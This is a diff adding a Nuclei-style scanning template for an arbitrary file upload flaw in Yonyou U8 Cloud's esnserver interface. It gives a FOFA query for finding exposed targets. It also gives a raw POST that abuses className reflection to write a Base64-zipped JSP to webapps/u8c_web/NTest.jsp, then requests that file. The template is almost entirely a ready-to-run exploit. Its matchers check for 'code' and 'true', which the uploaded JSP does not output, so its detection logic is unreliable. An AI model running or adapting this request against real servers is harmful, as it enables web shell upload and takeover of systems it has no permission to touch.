@@ -1,0 +1,40 @@
+id: yonyou-u8-cloud-esnserver-rce
+
+info:
+  name: "用友 U8 Cloud esnserver 接口 className 参数反射调用漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title=="U8C"
+          通过接口esnserver的className参数可触发非预期的类加载行为，攻击者可构造特定类名参数（如nc.itf.hr.tools.IfileTrans）实现Base64压缩文件解码与写入操作，达成任意文件上传目的。该漏洞允许远程攻击者绕过预期执行流程，导致目标系统被入侵和控制。
+  tags: 用友U8
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /service/esnserver HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded
+    Token: 469ce01522f64366750d1995ca119841
+
+    {"invocationInfo":{"ucode":"123","dataSource":"U8cloud","lang":"en"},"method":"uploadFile","className":"nc.itf.hr.tools.IFileTrans","param":{"p1":"UEsDBAoAAAAAAA9tSFkDJCbXbQAAAG0AAAAKAAAAY29tcHJlc3NlZDwlIG91dC5wcmludGxuKCJEdWRlU3VpdGUiKTsgbmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTsgJT5QSwECHwAKAAAAAAAPbUhZAyQm120AAABtAAAACgAkAAAAAAAAACAAAAAAAAAAY29tcHJlc3NlZAoAIAAAAAAAAQAYACbiFZZEGdsBHOcblEgZ2wERXscDRxnbAVBLBQYAAAAAAQABAFwAAACVAAAAAAA=","p2":"webapps/u8c_web/NTest.jsp"},"paramType":["p1:[B","p2:java.lang.String"]}
+- raw:
+  - |
+    GET /NTest.jsp HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'code'
+  - type: word
+    part: body
+    words:
+    - 'true'
